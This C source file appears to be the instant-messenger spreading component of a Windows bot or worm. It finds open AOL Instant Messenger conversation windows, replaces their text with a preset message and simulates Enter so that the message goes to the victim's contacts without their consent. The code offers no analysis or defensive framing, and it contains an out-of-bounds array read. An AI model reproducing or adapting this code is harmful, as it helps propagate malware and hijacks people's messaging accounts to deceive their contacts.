#ifndef NO_AIM

#include "../header/includes.h"
#include "../header/functions.h"
#include "../header/externs.h"

#define CLASS_SIZE 500

BOOL CALLBACK EnumAIMChild(HWND hwnd, LPARAM lParam)
{
	char ClassName[255];
	char IMText[55];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"Ate32Class"))
	{
		SendMessage(hwnd,WM_GETTEXT,sizeof(IMText),(LPARAM)IMText);
		if(IMText[55]=='E'||IMText[0]!='<')
		{
			SendMessage(hwnd,WM_SETTEXT,0,(LPARAM)AIMmesg);
			SendMessage(hwnd,WM_KEYDOWN,VK_F23,0);
			SendMessage(hwnd,WM_KEYDOWN,VK_RETURN,0);
			SendMessage(hwnd,WM_KEYUP,VK_RETURN,0);
			SendMessage(hwnd,WM_KEYUP,VK_F23,0);
		}
	}
	return true;
}

BOOL CALLBACK EnumAIM(HWND hwnd, LPARAM lParam)
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"AIM_IMessage"))
		EnumChildWindows(hwnd,EnumAIMChild,0);
	return true;
}

#endif